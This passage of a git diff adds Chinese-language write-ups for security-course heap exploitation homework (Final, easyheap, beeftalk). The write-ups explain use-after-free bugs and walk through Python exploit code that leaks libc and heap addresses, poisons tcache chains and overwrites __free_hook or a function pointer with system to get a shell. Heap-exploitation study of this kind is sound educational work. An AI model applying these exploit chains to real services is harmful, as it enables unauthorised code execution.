@@ -483,3 +483,301 @@ send_cmd2srv("global", "read", (FLAG_PATH+"\0").encode())
 ![Fullchain-nerf result](./resources/fullchain-nerf%20result.png)
 
 我的解題順序其實是先寫 `fullchain-nerf` 才去解 `fullchain`，所以才會跟 fullchain 那邊的解法有滿多差異，Code 也比較沒有邏輯 XD
+
+## Homework - Final (Exploit Provided)
+
+這題助教有提供 Exploit 當作一個學習的教材，但這邊還是會以從頭打的想法來撰寫這個 Writeup。
+
+### Recon
+
+先從 Source Code 來看起。最大的問題是有 Use After Free 的問題：
+
+```c++
+void release()
+{
+    unsigned long idx = 0;
+    printf("which one to release (0 or 1) ?\n> ");
+    idx = readu64();
+    if (idx != 0 && idx != 1) return;
+    
+    // 在釋放完後並沒有將 ptr 清成 NULL，可以做 double free
+    if (animals[idx]) {
+        free(animals[idx]->name);
+        free(animals[idx]);
+    }
+}
+```
+
+每當程式呼叫 `release` 來釋放 Animal 佔用的資源時，卻沒有清空原本存放在變數中的記憶體位置，導致已經送回給 `glibc` 管理的 heap memory chunk 還可以被使用者使用，進而導致一連串的 Tcache Chain Poisoning, Unsortedbin leak libc address。有了 UAF 也可以透過控制分配記憶體的順序，讓同段記憶體區段同時有兩種解釋，寫入後執行。
+
+其他還有幾個可利用的地方：
+
+- 在 `buy` 中，使用者可以透過指定名字長度分配記憶體大小，導致攻擊者可以控制 `glibc` 管理 Heap Memory Chunk 的管理邏輯
+- 寫入的方法沒有在使用者輸入尾巴加入 `\x00`（雖然從 `easyheap`, `beeftalk` 來說，即使有加也沒用），使用者可以輕易 Leak 出 Memory 中的數值
+
+有了這些弱點就可以串起整條攻擊串鏈了。
+
+### Pwn
+
+三個提供的 Exploit 都有個共通的前置動作：
+
+1. 透過可控的分配記憶體大小，創造出一塊被釋放後會送到 Unsortedbin 的記憶體，再透過 UAF 洩漏出 libc 的位置
+2. Leak 出 Heap 的位置
+
+在取的該有的記憶體位置後，有三種可行的路徑：
+
+- 複寫 `Animal` 中的 `bark` Function Ptr 成 `system`，送進字串後達成 Get Shell 的目標
+- 使用 `execve` 的 One Gedget 嘗試達成 Getshell 的目標，但因為 `rdx` 沒辦法滿足而失敗
+- 複寫 `__free_hook` 中的值成 `system` 的位置，創建一塊有 `/bin/sh` 字串的記憶體後，釋放記憶體位置進而觸發 `__free_hook` 達成 Get Shell 的目標
+
+#### Leak Libc 位置與 Heap 位置
+
+因為 unsortedbin 實作上的關係，裡面的 Chunk 的連結是都是透過雙向 Linked List 實作的，所以在裡面的 Chunk 身上，`fd` 會帶有 `main_arena+96` (libc 2.31) 的值。所以我們可以透過洩漏這個數值，再手動計算出 libc 的 Base Address：
+
+```python
+buy(0, 0x410, 'dummy')
+buy(1, 0x410, 'dummy') # 由於 freed chunk 相鄰 top chunk 時會觸發 consolidate，因此多放一塊 chk 來避免
+release(0)
+buy(0, 0x410, 'AAAAAAAA')
+play(0)
+
+r.recvuntil('A'*8)
+# 從 bk 留下的 unsorted bin address 來 leak
+libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
+```
+
+接著就可以計算出 `__free_hook`、`system`、`execve one gadget` 的位置。
+
+當然為了要預測下一塊 heap chunk 位置或是維持 tcache chain 的正確性，`heap` 的位置能得到是最好的，而剛好 UAF 的緣故，Heap 的位置可以簡單得到：
+
+```python
+# 2. 再利用 UAF 去 leak tcache 的 fd，得到 heap address
+buy(0, 0x10, 'dummy')
+buy(1, 0x10, 'dummy')
+release(0)
+release(1)
+play(1)
+r.recvuntil('MEOW, I am a cute ')
+heap = u64(r.recv(6).ljust(8, b'\x00')) - 0xb40
+info(f"heap: {hex(heap)}")
+```
+
+#### Exploit 1：劫持 `bark` Function Ptr 成 `system`
+
+因為 Tcache Chain 的運作機制，經過剛剛兩次 Free 後 `0x30` 的 Chain 中有兩塊已經被釋放的 `Animal` Memory Chunk。但是因為所有 Ptr 都還存在 `animals` 中，所以可以透過 `0x30` 大小的 `name` 剛好跟 `animals[0]` 是同一塊記憶體的行為，去 Hijack `animals[0]` 的 `bark` Function Ptr 成 `system` 後 Get Shell：
+
+```python
+buy(1, 0x28, b'/bin/sh\x00' + b'A'*0x8 + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(_system))
+# 3. get shell
+play(0)
+```
+
+#### Exploit 2：劫持 `bark` Function Ptr 成 `execve` one gadget
+
+跟上一題類似，只是這次要嘗試使用 `execve` 的 OneGadget 達成 Get Shell：
+
+```txt
+root@92a870dfedbf:/tmp/code/HW-final# one_gadget /lib/x86_64-linux-gnu/libc.so.6
+0xe6c7e execve("/bin/sh", r15, r12)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [r12] == NULL || r12 == NULL
+
+0xe6c81 execve("/bin/sh", r15, rdx)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xe6c84 execve("/bin/sh", rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+```
+
+```python
+buy(1, 0x28, b'A'*0x10 + p64(0x10000) + p64(heap + 0xbe0) + p64(0xdeadbeef))
+buy(1, 0x10, 'dummy')
+change(0, 0xffffffff, p64(heap+0x100) + p64(0) + p64(0xdeadbeef) + p64(heap+0x100) + p64(one_shot), False)
+play(1)
+```
+
+但因為 `rdx` 沒辦法完全吻合，所以最後會 Crash 掉。
+
+#### Exploit 3：劫持 `__free_hook` 成 `system`
+
+這個 Exploit 作法就比較 General 了，不像上兩個還仰賴 struct 中要有我們可控的 Function Ptr。這邊有好幾種方法可以達到改寫 `__free_hook` 的目的，但原理都還是圍繞在 Tcache Poisoning 以及精準控制 `malloc` 的分配順序。
+
+助教這邊的 Exploit 原理，是透過修改 Tcache Chain 中 `0x30` bin 的順序，達成 `__free_hook` Hijack 的同時，也順便把等等 `free` 所需要的 Parameter (`/bin/sh`) 也一起設定好，最後只要呼叫 `release` 後就可以 Get Shell：
+
+```python
+buy(1, 0x28, b'A'*0x10 + p64(0x10000) + p64(heap + 0xbe0) + p64(0xdeadbeef))
+buy(1, 0x10, 'dummy')
+release(1)
+change(0, 0xffffffff, b'A'*0x10 + p64(0xdeadbeef) + p64(heap + 0xb90), False)
+release(1)
+change(0, 0xffffffff, p64(__free_hook - 8), False)
+buy(1, 0x28, b'/bin/sh\x00' + p64(_system))
+release(1)
+```
+
+## Homework - easyheap
+
+這題 Source Code 跟剛剛上一題 Final 基本上是同一份程式碼改出來的，差別只在於交換資料的方式，以及多了一些簡單的防禦。所以直接進 Pwn 吧
+
+### Pwn
+
+思考流程跟剛剛的 Exploit 3 一樣：
+
+- Leak 出 libc 的 base address 以及 heap 的 base address
+- 修改 `__free_hook` 成 `system`
+- 觸發 `free` Get Shell
+
+#### 取得 Libc 以及 Heap 的 Base Address
+
+首先先把 unsortedbin 中塞滿幾個 Chunk：
+
+```python
+add_book(0, 0x410, "UAF-1", 1000)
+add_book(1, 0x410, "UAF-2", 1000)
+add_book(2, 0x410, "UAF-3", 1000)
+delete_book(0)
+delete_book(1)
+delete_book(2)
+```
+
+![EASY_HEAP_unsortedbin](./resources/EasyHeapUnsortedbin.png)
+
+這兩個在 Unsortedbin 中的 Chunk 可以讓我們直接 Leak 出 Heap 的位置：
+
+```python
+# def get_name_from_idx(idx: int)
+get_name_from_idx(2)
+BASE_HEAP = u64(r.recv(6).ljust(8, b'\x00')) - 0x2a0
+```
+
+下一個目標是要 print 出 `main_arena+96` 的位置，但因為 chunk 進 tcache 後 header 會被改寫，所以我們可以透過連續 chunk 去改寫在 `fd` 中的值在 Leak 出來：
+
+```python
+edit_book(1, p64(BASE_HEAP + 0x2c0 + 0x10))
+get_name_from_idx(0)
+BASE_LIBC = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
+```
+
+![Easy Heap Leak Libc](./resources/EasyHeap_leak_libc.png)
+
+#### 劫持 `__free_hook` 成 `system`
+
+跟剛剛寫入方法一樣，其實我們現在已經可以修改任意位置的值了，我們只要把 `system` 的位置寫到 `__free_hook` 中就行了：
+
+```python
+ADDR_SYSTEM = BASE_LIBC + 0x55410
+ADDR_FREE_HOOK = BASE_LIBC + 0x1eeb28
+
+edit_book(1, p64(ADDR_FREE_HOOK))
+edit_book(0, p64(ADDR_SYSTEM))
+```
+
+#### 觸發 `free`
+
+最後觸發 `free` 就可以 Get Shell 了
+
+```python
+add_book(4, 0x8, "/bin/sh", 1000)
+delete_book(4)
+```
+
+![Easy Heap Result](./resources/Easyheap_result.png)
+
+## Homework - beeftalk
+
+這題的 Code base 比較大，原本想說會需要用到 `fifo` 的機制才可順利達成目標，結果當我 Trace 完 Code 才發現，好像完全用不到 `chat` 就可以達成 hijack `__free_hook` 的目標了XD
+
+### Pwn
+
+流程還是一樣：
+
+- Leak 出 libc 的 base address 以及 heap 的 base address
+- 修改 `__free_hook` 成 `system`
+- 觸發 `free` Get Shell
+
+#### 取得 Libc 以及 Heap 的 Base Address
+
+這題跟前幾題不一樣的地方是沒辦法在簡單的把 Chunk 直接分配超過 tcache 管理的大小範圍而直接把 Chunk 送到 Unsortbin 中，但其實只要 Allocate 0x80 大小的 Chunk 8 次，塞滿 Tcache 0x90 Chain 後再一次釋放就可以把最後一塊 Memory Chunk 送進 Unsortbin 中了：
+
+```python
+# Place Blocks in Unsorted Bin
+# Create 8 Users
+for i in range(8):
+    r_tokens.append(signup(r, b'A'*0x80, b"PWN", b"SEC"))
+
+# Login and Delete
+# This Part should be reverse, cause consolidation problem
+for i in range(8):
+    login(r, r_tokens[7-i])
+    delete_account(r, r_tokens[7-i])
+```
+
+下一步是要如何取得 Libc 的值。因為 `desc` 和 `User` struct 本身都是 `0x50` 大小的 Chunk，所以在 Free 完後 Tacache Chain 中每個 `User` 中間會卡一個 `desc` 的 Block 而沒辦法透過寫入 unsortbin chunk 的位置後讀取：
+
+![Beeftalk 0x50 Tcache Chain](./resources/Beeftalk_0x50_chain.png)
+
+這時只要在簡單 Allocate 一個 User，讓原本 `desc` 那塊記憶體變成 `User`，而原本 `User` 的記憶體區塊變成 `desc`，等等再釋放一次後，我們就成功改動 0x50 Tcache Chain 的順序了：
+
+```python
+# Change Tcache Chain Chunk Sequence
+r_tokens[0] = signup(r, b'A'*0x80, b"PWN", b"SEC")
+login(r, r_tokens[0])
+delete_account(r, r_tokens[0])
+```
+
+接著就用類似 Easyheap 的方法，修改 Chain 的順序後讀出 `main_arena+96` 的數值，我們就有 Libc 的基值了：
+
+```python
+login(r, r_tokens[0])
+update_user(r, p64(BASE_HEAP+0x3f0), b"PWN", p64(BASE_HEAP + 0x6d0))
+logout(r)
+
+login(r, r_tokens[5])
+r.recvuntil(b"Hello ")
+BASE_LIBC = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
+logout(r)
+```
+
+#### 劫持 `__free_hook` 成 `system`
+
+跟剛剛斷鏈的方法一樣，我們也可以透過這個方法寫入 `__free_hook`：
+
+```python
+ADDR_SYSTEM = BASE_LIBC + 0x55410
+ADDR_FREE_HOOK = BASE_LIBC + 0x1eeb28
+
+# Write FREELIBC
+login(r, r_tokens[0])
+update_user(r, p64(ADDR_FREE_HOOK), b"PWN", p64(BASE_HEAP + 0x6d0))
+logout(r)
+
+login(r, r_tokens[5])
+update_user(r, p64(ADDR_SYSTEM), b"PWN", p64(BASE_HEAP + 0xd90))
+logout(r)
+```
+
+最後在 `free` 之前，我還有重新把 Chain 接回去，一免分配錯誤：
+
+```python
+# Restore Chain
+login(r, r_tokens[0])
+update_user(r, p64(BASE_HEAP+0xb90), b"PWN", p64(BASE_HEAP + 0x6d0))
+logout(r)
+```
+
+#### 觸發 `free`
+
+簡單觸發 `free(user->name)` 後 Get Shell：
+
+```python
+r_tokens[0] = signup(r, b"/bin/sh", b"PWN", b"SEC")
+login(r, r_tokens[0])
+delete_account(r, r_tokens[0])
+```
+
+![Beeftalk Result](./resources/Beeftalk_result.png)
